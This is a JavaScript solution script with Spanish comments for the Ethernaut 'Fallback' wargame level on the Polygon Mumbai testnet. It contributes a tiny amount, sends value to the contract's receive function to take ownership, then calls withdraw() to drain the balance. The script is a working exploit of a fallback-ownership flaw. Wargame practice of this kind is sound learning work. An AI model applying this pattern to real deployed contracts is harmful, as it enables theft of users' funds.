ENV_NODE=require('dotenv').config();
const Web3 = require('web3');
const Provider = require('@truffle/hdwallet-provider');

const address = '0x601eaA885bF37D28906Ad58d7508cFa1Af10E754'; // la de mi billetera desde donde hice la instancia del contrato
const privateKey = ENV_NODE.parsed.privKey; // la clave privada de la billetera para poder firmar
const nodeUrl = `https://polygon-mumbai.g.alchemy.com/v2/${process.env.PROJECT_ID}`; // el nodo con que firmaré

const SCaddress = '0x6946eA5d89052Db61E3111839987e081A22D6537'; // address del smart contract
//Abi del smart contract: JSON.stringify(contract.abi) en consola dentro de ethernaut
const abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"contribute","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0xd7bb99ba"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"contributions","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x42e94c90"},{"inputs":[],"name":"getContribution","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xf10fdf5c"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0x3ccfd60b"},{"stateMutability":"payable","type":"receive","payable":true}];


// creo funcion asincronica que haga paso a paso
const init3 = async () => {
    // creo provider con el nodo provisto y mi llave privada para poder hacer las firmas sin metamask
    const provider = await new Provider(privateKey, nodeUrl); 
    // genero la instancia web3
    const web3 = await new Web3(provider);
    // creo instancia del contrato para llamar a sus funciones
    const myContract = await new web3.eth.Contract(abi,SCaddress);
  
    // resuelvo el problema primero agregando contribución, luego llamando al receive mandandole algún value
    // y con eso ya quedo como el owner. Luego hago el widthdraw() y al terminar de ejecutarlo solo debo
    // precionar submit en el ejercicio de ethernaut y me lo califica. (esto puede verse en consola del navegador)
    console.log(`Owner: ${await myContract.methods.owner().call()}`);
    console.log(`My Account: ${await web3.eth.getAccounts()}`);

    let receipt;
    receipt= await myContract.methods.contribute().send({ from: address, value: 1 });
    receipt= await web3.eth.sendTransaction({ from: address, to: SCaddress, value: '1' });
    console.log(`New Owner: ${await myContract.methods.owner().call()}`);
    console.log(`Balance al principio: ${await web3.eth.getBalance(SCaddress)}`);
    receipt= await myContract.methods.withdraw().send({ from: address });
    console.log(`Balance luego de robarlo: ${await web3.eth.getBalance(SCaddress)}`);

  }
  
  init3();